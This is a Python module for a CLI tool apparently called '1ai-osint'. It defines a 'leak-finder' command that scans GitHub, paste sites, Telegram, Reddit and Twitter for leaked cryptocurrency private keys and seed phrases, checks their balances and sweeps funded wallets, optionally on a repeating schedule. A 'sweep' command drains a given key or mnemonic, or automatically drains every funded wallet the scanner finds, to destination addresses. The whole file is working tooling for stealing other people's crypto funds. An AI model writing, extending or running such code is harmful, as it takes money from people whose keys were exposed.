"""Crypto-related commands — leak finding, key sweeping."""

from __future__ import annotations

import asyncio
import json
import os

import typer

from ..app import app


@app.command()
def leak_finder(
    continuous: bool = typer.Option(False, "--continuous", "-c", help="Run in continuous mode (periodic scans)"),
    address: str = typer.Option("", "--address", "-a", help="Search for a specific wallet address"),
    sources: str = typer.Option(
        "github,paste,telegram,reddit,twitter",
        "--sources",
        "-s",
        help="Comma-separated list of sources: github, paste, telegram, reddit, twitter",
    ),
    interval: int = typer.Option(
        300,
        "--interval",
        "-i",
        help="Seconds between runs in continuous mode (default: 300)",
    ),
    github_token: str = typer.Option("", help="GitHub API token for authenticated search (higher rate limits)"),
) -> None:
    """Find leaked crypto keys and mnemonics from public sources.

    Searches GitHub, paste sites, and Telegram for leaked private keys
    and mnemonic phrases, then checks balances and sweeps funded wallets.

    Examples:
        # One-shot scan of all sources
        1ai-osint leak-finder

        # Search for a specific address
        1ai-osint leak-finder --address 0xAbCdEf...

        # Continuous monitoring every 10 minutes
        1ai-osint leak-finder --continuous --interval 600

        # Only scan GitHub and pastes
        1ai-osint leak-finder --sources github,paste

    """
    from src.modules.crypto.leak_finder.coordinator import (
        ALL_SOURCES,
        LeakFinderCoordinator,
    )

    if sources.strip().lower() == "all":
        source_list = list(ALL_SOURCES)
    else:
        source_list = [s.strip() for s in sources.split(",") if s.strip()]
    invalid = [s for s in source_list if s not in ALL_SOURCES]
    if invalid:
        typer.echo(
            f"Error: Unknown source(s): {', '.join(invalid)}. " f"Valid sources: {', '.join(ALL_SOURCES)}",
            err=True,
        )
        raise typer.Exit(1)

    coordinator = LeakFinderCoordinator(
        sources=source_list,
        github_token=github_token or os.getenv("GITHUB_TOKEN") or None,
    )

    async def _run() -> None:
        await coordinator.start()
        try:
            if address:
                typer.echo(f"Searching for address: {address}", err=True)
                result = await coordinator.search_address(address)
                typer.echo(
                    f"Search complete: {result.raw_leaks_fetched} raw leaks, " f"{result.keys_deduplicated} keys found"
                )
            elif continuous:
                typer.echo(
                    f"Starting continuous leak finder " f"(sources: {', '.join(source_list)}, interval: {interval}s)",
                    err=True,
                )
                await coordinator.run_continuous(interval_sec=interval)
            else:
                typer.echo(f"Running leak finder (sources: {', '.join(source_list)})", err=True)
                result = await coordinator.run_once()
                typer.echo(
                    f"Scan complete:\n"
                    f"  Raw leaks fetched:  {result.raw_leaks_fetched}\n"
                    f"  Keys extracted:     {result.keys_extracted}\n"
                    f"  Addresses checked:  {result.addresses_checked}\n"
                    f"  Funded wallets:     {result.funded_wallets}\n"
                    f"  Sweeps attempted:   {len(result.sweep_results)}\n"
                    f"  Elapsed:            {result.elapsed_seconds:.1f}s"
                )
        finally:
            await coordinator.stop()

    asyncio.run(_run())


@app.command()
def sweep(
    auto: bool = typer.Option(False, help="Auto-sweep all funded wallets from discovered keys"),
    key: str = typer.Option(None, help="Specific private key to sweep"),
    mnemonic: str = typer.Option(None, help="Specific mnemonic to sweep"),
    chain: str = typer.Option("all", help="Chain to sweep: all, ethereum, solana, bitcoin"),
    dry_run: bool = typer.Option(False, help="Dry run — show what would be swept without executing"),
) -> None:
    """Sweep funds from leaked wallets to destination addresses."""

    async def _sweep() -> None:
        from src.modules.crypto.balance.sweeper import Sweeper

        sweeper = Sweeper()

        try:
            if mnemonic:
                typer.echo(f"Sweeping mnemonic: {mnemonic[:20]}...")
                result = await sweeper.sweep_from_mnemonic(  # type: ignore[attr-defined]
                    mnemonic, chain=chain, dry_run=dry_run
                )
                typer.echo(json.dumps(result, indent=2, default=str))
            elif key:
                typer.echo(f"Sweeping key: {key[:10]}...")
                result = await sweeper.sweep_from_key(key, chain=chain, dry_run=dry_run)  # type: ignore[attr-defined]
                typer.echo(json.dumps(result, indent=2, default=str))
            elif auto:
                typer.echo("Auto-sweep: scanning for funded wallets...")
                # Use leak finder to find keys, then sweep
                from src.modules.crypto.leak_finder.coordinator import (
                    LeakFinderCoordinator,
                )

                coordinator = LeakFinderCoordinator()
                await coordinator.start()
                result = await coordinator.run_once()
                await coordinator.stop()

                typer.echo(f"Found {result.funded_wallets} funded wallets")
                if result.sweep_results:
                    for sr in result.sweep_results:
                        typer.echo(f"  Swept: {sr}")
            else:
                typer.echo("Specify --key, --mnemonic, or --auto", err=True)
                raise typer.Exit(1)
        finally:
            await sweeper.stop()  # type: ignore[attr-defined]

    asyncio.run(_sweep())
